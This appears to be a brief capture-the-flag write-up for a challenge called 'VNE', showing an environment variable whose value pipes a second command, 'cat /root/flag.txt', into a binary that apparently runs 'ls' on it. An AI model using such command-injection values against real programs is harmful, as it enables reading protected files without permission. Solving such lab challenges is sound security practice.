# VNE

```
export SECRET_DIR="/root | cat /root/flag.txt"
```

The binary probably executes `ls ${SECRET_DIR}`. Thus, the above value results in the command-injection-attack.
